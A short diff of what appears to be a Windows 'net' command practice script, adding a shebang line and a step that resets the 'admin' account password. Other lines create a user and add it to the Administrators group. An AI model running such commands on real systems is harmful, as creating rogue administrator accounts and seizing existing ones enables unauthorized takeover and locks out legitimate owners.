@@ -1,3 +1,5 @@
+#!/usr/bin/peno
+
 net user /add Tristan greatpassword
 net localgroup
 net localgroup Administrators Tristan /add
@@ -8,3 +10,5 @@ net share /?
 net stop WSearch
 net start WSearch
 
+#Attempting to change the password
+net user admin Ev!lpass
